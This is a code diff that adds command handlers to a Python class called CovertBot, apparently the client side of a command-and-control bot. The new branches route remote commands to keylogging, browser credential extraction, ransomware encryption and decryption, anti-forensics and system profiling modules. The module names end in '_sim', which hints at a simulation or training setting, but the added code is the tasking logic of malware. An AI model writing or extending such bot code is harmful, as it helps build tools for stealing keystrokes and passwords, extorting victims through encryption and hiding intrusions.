@@ -841,6 +841,45 @@ class CovertBot:
                       f"(new key: {derive_key(SHARED_SECRET).hex()[:8]}...)")
             else:
                 print(f"[COVERT] -> update_secret ignored: secret too short (<8 chars)")
+                
+        elif cmd_type == "start_keylogger":
+            import keylogger_sim
+            result = keylogger_sim.handle_c2_task(cmd)
+            print(f"[COVERT] keylogger: {result}")
+
+        elif cmd_type == "stop_keylogger":
+            import keylogger_sim
+            result = keylogger_sim.handle_c2_task(cmd)
+            print(f"[COVERT] keylogger: {result}")
+
+        elif cmd_type == "get_keylogs":
+            import keylogger_sim
+            result = keylogger_sim.handle_c2_task(cmd)
+            print(f"[COVERT] keylogs ({result.get('length',0)} chars): "
+                f"{result.get('keylogs','')[:100]}")
+
+        elif cmd_type == "extract_creds":
+            import cred_extractor_sim
+            extractor = cred_extractor_sim.BrowserCredExtractor()
+            creds = extractor.extract_all()
+            print(f"[COVERT] Extracted {len(creds)} credential(s)")
+
+        elif cmd_type in ("ransom_setup","ransom_encrypt","ransom_decrypt",
+                        "ransom_status","ransom_cleanup"):
+            import ransomware_sim
+            result = ransomware_sim.handle_c2_task(cmd)
+            print(f"[COVERT] ransomware: {result.get('status')}")
+
+        elif cmd_type in ("anti_forensics","anti_forensics_status"):
+            import anti_forensics_sim
+            result = anti_forensics_sim.handle_c2_task(cmd)
+            print(f"[COVERT] anti_forensics: {result}")
+
+        elif cmd_type == "system_profile":
+            import system_profiler
+            result = system_profiler.handle_task(cmd)
+            print(f"[COVERT] system_profile collected "
+                f"({len(str(result))} chars)")
 
         else:
             print(f"[COVERT] -> Unknown command type: {cmd_type}")
